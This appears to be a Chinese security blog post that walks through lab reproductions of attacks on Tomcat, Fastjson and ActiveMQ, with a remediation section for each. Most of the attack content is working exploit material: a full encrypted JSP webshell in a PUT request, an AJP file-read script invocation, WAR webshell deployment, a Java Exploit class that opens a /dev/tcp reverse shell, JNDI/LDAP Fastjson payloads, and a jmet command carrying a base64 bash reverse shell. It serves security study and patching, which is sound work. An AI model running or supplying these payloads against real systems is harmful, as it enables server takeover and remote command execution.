<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>靶场复现 | freelander</title><meta name="author" content="freelander"><meta name="copyright" content="freelander"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="靶场复现step1：tomcat put协议文件上传漏洞漏洞概述：当 Tomcat运行在Windows或者Linux操作系统，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求上传任意文件，包括JSP类型的木马。 漏洞影响版本：Apache Tomcat 7.0.0 - 7.0.81 漏洞复现：抓包，修改方式">
<meta property="og:type" content="article">
<meta property="og:title" content="靶场复现">
<meta property="og:url" content="http://example.com/2023/08/19/images1/index.html">
<meta property="og:site_name" content="freelander">
<meta property="og:description" content="靶场复现step1：tomcat put协议文件上传漏洞漏洞概述：当 Tomcat运行在Windows或者Linux操作系统，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求上传任意文件，包括JSP类型的木马。 漏洞影响版本：Apache Tomcat 7.0.0 - 7.0.81 漏洞复现：抓包，修改方式">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
<meta property="article:published_time" content="2023-08-19T08:35:30.559Z">
<meta property="article:modified_time" content="2023-08-19T09:42:07.631Z">
<meta property="article:author" content="freelander">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/08/19/images1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '靶场复现',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-08-19 17:42:07'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="freelander"><span class="site-name">freelander</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">靶场复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-19T08:35:30.559Z" title="发表于 2023-08-19 16:35:30">2023-08-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-19T09:42:07.631Z" title="更新于 2023-08-19 17:42:07">2023-08-19</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="靶场复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="靶场复现"><a href="#靶场复现" class="headerlink" title="靶场复现"></a>靶场复现</h1><h2 id="step1：tomcat-put协议文件上传漏洞"><a href="#step1：tomcat-put协议文件上传漏洞" class="headerlink" title="step1：tomcat put协议文件上传漏洞"></a>step1：tomcat put协议文件上传漏洞</h2><h3 id="漏洞概述："><a href="#漏洞概述：" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>当 Tomcat运行在Windows或者Linux操作系统，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求上传任意文件，包括JSP类型的木马。</p>
<h3 id="漏洞影响版本："><a href="#漏洞影响版本：" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>Apache Tomcat 7.0.0 - 7.0.81</p>
<h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>抓包，修改方式为OPTIONS，查看是否允许PUT方法。</p>
<p><img src="/2023/08/19/images1/tomcat-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01.png"></p>
<p>修改方式为PUT，上传jsp木马,返回包显示201即上传成功。</p>
<p>数据包如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PUT /test.jsp/ HTTP/1.1</span><br><span class="line">Host: 192.168.88.111:8080</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 542</span><br><span class="line"></span><br><span class="line">AAAAA&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;bbbb</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/tomcat-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02.png"></p>
<p>“&#x2F;”在文件名中的命名是非法的，所以在数据包中上传test.jsp&#x2F;，到Linux中会去掉“&#x2F;”这个符号以此来绕过检测，上传木马文件。</p>
<p>通过冰蝎连接木马</p>
<p><img src="/2023/08/19/images1/tomcat-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A03.png"></p>
<h3 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h3><ul>
<li>升级tomcat的版本到7.0.81以上</li>
<li>到conf&#x2F;web.xml配置文件中修改readonly的值为true或则直接删除readonly</li>
</ul>
<h2 id="step2：tomcat-ajp协议漏洞"><a href="#step2：tomcat-ajp协议漏洞" class="headerlink" title="step2：tomcat ajp协议漏洞"></a>step2：tomcat ajp协议漏洞</h2><h3 id="漏洞概述：-1"><a href="#漏洞概述：-1" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>2020年2月20日，国家信息安全漏洞共享平台(CNVD)发布关于Apache Tomcat的安全公告，Apache Tomcat文件包含漏洞(CNVD-2020-10487，对应CVE-2020-1938)。Tomcat AJP协议由于存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步实现远程代码的执行。</p>
<h3 id="漏洞影响版本：-1"><a href="#漏洞影响版本：-1" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><ul>
<li>Apache Tomcat 9.x &lt; 9.0.31</li>
<li>Apache Tomcat 8.x &lt; 8.5.51</li>
<li>Apache Tomcat 7.x &lt; 7.0.100</li>
<li>Apache Tomcat 6.x</li>
</ul>
<h3 id="漏洞复现：-1"><a href="#漏洞复现：-1" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>tomcat的serverl.xml对ajp的开放状态，如果此时你的防火墙也开放了对应的8009端口，就可以被攻击者利用此漏洞读取任意文件，若服务器端同时存在文件上传功能，攻击者可进一步实现远程代码的执行。。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.88.48  -p 8009   -f  WEB-INF/server.xml</span><br><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.88.48  -p 8009   -f  index.jsp</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/1.png"></p>
<h3 id="修复方案：-1"><a href="#修复方案：-1" class="headerlink" title="修复方案："></a>修复方案：</h3><ul>
<li><p>将Tomcat立即升级到9.0.31、8.5.51或7.0.100版本进行修复。</p>
</li>
<li><p>禁用AJP协议</p>
<p>编辑 &#x2F;conf&#x2F;server.xml，找到如下行： 将此行注释掉(也可删掉该行)：</p>
<ul>
<li><p>配置secret来设置AJP协议的认证凭证。</p>
</li>
<li><p>在ajp协议中指定可访问的ip地址，配置address&#x3D;“ip地址”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector protocol=&quot;AJP/1.3&quot;</span><br><span class="line">              port=&quot;8009&quot;</span><br><span class="line">              address=&quot;ip地址&quot;</span><br><span class="line">              redirectPort=&quot;8443&quot; /&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="step3：tomcat弱口令密码爆破"><a href="#step3：tomcat弱口令密码爆破" class="headerlink" title="step3：tomcat弱口令密码爆破"></a>step3：tomcat弱口令密码爆破</h2><h3 id="漏洞概述：-2"><a href="#漏洞概述：-2" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>抓一下tomcat登陆管理界面的数据包，可以看出，其认证方式是在http的请求<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=header&spm=1001.2101.3001.7020">header</a>中添加一个字段为 Authorization，这个字段的值是 “Basic base64(username:password)”，因此在暴力破解时，只需要在请求包中添加该字段即可。</p>
<h3 id="漏洞影响版本：-2"><a href="#漏洞影响版本：-2" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>全版本存在</p>
<h3 id="漏洞复现：-2"><a href="#漏洞复现：-2" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>通过tomcat主页面，点击Manager App登录管理页面，在登录框中输入用户名密码，bp抓包。</p>
<p><img src="/2023/08/19/images1/2.png"></p>
<p>2.通过burpsuite抓取登录请求报文（用户名密码采用base64编码，用户名:密码  格式传输）</p>
<p><img src="/2023/08/19/images1/3.png"></p>
<p>3.bp设置参数进行爆破，第一个占位添加usernames。</p>
<p><img src="/2023/08/19/images1/4.png"></p>
<p>4.为第二个占位添加字符“:”。</p>
<p><img src="/2023/08/19/images1/5.png"></p>
<p>5.为第三个占位添加你的password字典。</p>
<p><img src="/2023/08/19/images1/6.png"></p>
<p>6.添加base64加密方式。</p>
<p><img src="/2023/08/19/images1/7.png"></p>
<p>7.爆破成功(tomcat&#x2F;tomcat)</p>
<p><img src="/2023/08/19/images1/8.png"></p>
<h3 id="修复方案：-2"><a href="#修复方案：-2" class="headerlink" title="修复方案："></a>修复方案：</h3><ul>
<li><p>将默认账号密码注释掉，修改成强密码。</p>
</li>
<li><p>代码里修改密码爆破的次数，一旦超过次数就会锁定账号无法登录。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Realm className=&quot;org.apache.catalina.realm.LockOutRealm&quot; failureCount=&quot;填写密码爆破的次数限制&quot; lockOutTime=&quot;0&quot;&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>将tomcat的版本升级到6.0以上。</p>
</li>
</ul>
<h2 id="step4-tomcat后台war部署后门getshell漏洞"><a href="#step4-tomcat后台war部署后门getshell漏洞" class="headerlink" title="step4:tomcat后台war部署后门getshell漏洞"></a>step4:tomcat后台war部署后门getshell漏洞</h2><h3 id="漏洞概述：-3"><a href="#漏洞概述：-3" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>tomcat存在管理后台进行应用部署管理，管理员只需要上传一个war格式的文件就可以发布到网站。war包是用来进行Web开发时一个网站项目下的所有代码,包括前台HTML&#x2F;CSS&#x2F;JS代码,以及后台JavaWeb的代码。 War包 可以放在Tomcat下的webapps或word目录,当Tomcat服务器启动时，War包即会随之解压源代码来进行自动部署。</p>
<h3 id="漏洞影响版本：-3"><a href="#漏洞影响版本：-3" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>tomcat的全部版本</p>
<h3 id="漏洞复现：-3"><a href="#漏洞复现：-3" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>1.登录后台界面找到上传点。</p>
<p><img src="/2023/08/19/images1/9.png"></p>
<p>2.制作war包上传</p>
<ul>
<li><p>将jsp木马文件压缩成zip文件再修改后缀</p>
</li>
<li><p>将后门文件打包到war包，需本地配置java环境</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf war.war “shell.jsp”</span><br></pre></td></tr></table></figure></li>
</ul>
<p>3.getshell</p>
<p>上传war包后，会自动解压到网站根目录下&#x2F;shell（你的war包名字）&#x2F;shell.jsp（你的后门名字），通过c刀等工具连接，getshell。</p>
<p><img src="/2023/08/19/images1/10.png"></p>
<p>验证木马是否上传成功</p>
<p><img src="/2023/08/19/images1/11.png"></p>
<p><img src="/2023/08/19/images1/12.png"> </p>
<p>4.冰蝎连接</p>
<p><img src="/2023/08/19/images1/13.png"></p>
<h3 id="修复方案：-3"><a href="#修复方案：-3" class="headerlink" title="修复方案："></a>修复方案：</h3><ul>
<li>1、在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。</li>
<li>2、增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME&#x2F;conf&#x2F;web.xml文件设置锁定机制和时间超时限制。</li>
<li>3、以及针对manager-gui&#x2F;manager-status&#x2F;manager-script等目录页面设置最小权限访问限制。</li>
</ul>
<h2 id="step5-Fastjson反序列化漏洞"><a href="#step5-Fastjson反序列化漏洞" class="headerlink" title="step5:Fastjson反序列化漏洞"></a>step5:Fastjson反序列化漏洞</h2><h3 id="漏洞概述：-4"><a href="#漏洞概述：-4" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，其次，Fastjson自定义的反序列化机制时会调用指定类中的setter方法及部分getter方法，那么当组件开启了autotype功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。并且在Fastjson 1.2.47及以下版本中，利用其缓存机制可实现对未开启autotype功能的绕过。</p>
<h3 id="漏洞影响版本：-4"><a href="#漏洞影响版本：-4" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>fastjson&lt;&#x3D;1.2.24</p>
<h3 id="漏洞复现：-4"><a href="#漏洞复现：-4" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>工具准备：Exploit.java、marshalsec-0.0.3-SNAPSHOT-all.ja</p>
<p>漏洞复现步骤：python搭建http服务——marshalsec开启监听转发——nc开启监听接收shell——攻击——反弹成功：</p>
<p>1.burp抓包，改post请求，利用DNSlog判断漏洞是否存在。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POC：</span><br><span class="line">&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://sfvyzg.dnslog.cn&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/fastjson%E5%A4%8D%E7%8E%B01.png"></p>
<p><img src="/2023/08/19/images1/fastjson%E5%A4%8D%E7%8E%B02.png" alt=" "></p>
<ol start="2">
<li><h5 id="编写EXP，将里面的ip改为反弹shell的ip，文件命名为Exploit-java，并用javac编辑成Exploit-class。"><a href="#编写EXP，将里面的ip改为反弹shell的ip，文件命名为Exploit-java，并用javac编辑成Exploit-class。" class="headerlink" title="编写EXP，将里面的ip改为反弹shell的ip，文件命名为Exploit.java，并用javac编辑成Exploit.class。"></a>编写EXP，将里面的ip改为反弹shell的ip，文件命名为Exploit.java，并用javac编辑成Exploit.class。</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class Exploit&#123;</span><br><span class="line">    public Exploit() throws Exception &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/xx.xx.xx.xx/1888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        while((line = reader.readLine()) != null) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/fastjson%E5%A4%8D%E7%8E%B03.png"> </p>
<h5 id="3-python搭建临时的http服务-我这里用的python3"><a href="#3-python搭建临时的http服务-我这里用的python3" class="headerlink" title="3.python搭建临时的http服务(我这里用的python3)"></a>3.python搭建临时的http服务(我这里用的python3)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8083</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/fastjson%E5%A4%8D%E7%8E%B04.png"></p>
<h5 id="4-利用marshalsec开启监听转发。"><a href="#4-利用marshalsec开启监听转发。" class="headerlink" title="4.利用marshalsec开启监听转发。"></a>4.利用marshalsec开启监听转发。</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.88.219:8083/#Exploit 9999 Listening on 0.0.0.0:9999</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/fastjson%E5%A4%8D%E7%8E%B05.png"></p>
<h5 id="5-nc监听反弹shell。"><a href="#5-nc监听反弹shell。" class="headerlink" title="5.nc监听反弹shell。"></a>5.nc监听反弹shell。</h5><p><img src="/2023/08/19/images1/fastjson%E5%A4%8D%E7%8E%B06.png"></p>
<h5 id="6-开始构造payload进行攻击。"><a href="#6-开始构造payload进行攻击。" class="headerlink" title="6.开始构造payload进行攻击。"></a>6.开始构造payload进行攻击。</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;x&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://192.168.88.219:9999/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/fastjson%E5%A4%8D%E7%8E%B07.png"></p>
</li>
</ol>
<p>7.反弹shell成功。</p>
<p><img src="/2023/08/19/images1/fastjson%E5%A4%8D%E7%8E%B08.png"></p>
<h3 id="修复方案：-4"><a href="#修复方案：-4" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1.升级fastjson版本。</p>
<h2 id="step6-ActiveMQ反序列化漏洞"><a href="#step6-ActiveMQ反序列化漏洞" class="headerlink" title="step6:ActiveMQ反序列化漏洞"></a>step6:ActiveMQ反序列化漏洞</h2><h3 id="漏洞概述：-5"><a href="#漏洞概述：-5" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>  <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Apache&spm=1001.2101.3001.7020">Apache</a> ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，漏洞没有限制在代理中序列化的类，远程攻击者可以借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行恶意代码。</p>
<h3 id="漏洞影响版本：-5"><a href="#漏洞影响版本：-5" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>Apache ActiveMQ 5.13.0之前的版本</p>
<h3 id="漏洞复现：-5"><a href="#漏洞复现：-5" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>1.漏洞利用过程如下：</p>
<ul>
<li>a.构造（可以使用ysoserial）可执行命令的序列化对象</li>
<li>b.作为一个消息，发送给目标61616端口</li>
<li>c.访问的Web管理页面，读取消息，触发漏洞</li>
</ul>
<p>2.利用jmet进行反弹shell:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljg4LjExMS8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 192.168.88.111   61616</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/ActiveMQ%E5%A4%8D%E7%8E%B02.png"> </p>
<p><img src="/2023/08/19/images1/ActiveMQ%E5%A4%8D%E7%8E%B01.png"></p>
<p>3.点击创建事件并开启端口监听反弹shell。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/ActiveMQ%E5%A4%8D%E7%8E%B03.png"> </p>
<p><img src="/2023/08/19/images1/ActiveMQ%E5%A4%8D%E7%8E%B04.png"></p>
<h3 id="修复方案：-5"><a href="#修复方案：-5" class="headerlink" title="修复方案："></a>修复方案：</h3><ul>
<li>将ActiveMQ升级到最新版本</li>
<li>有WAF的可以配置相关规则进行拦截</li>
</ul>
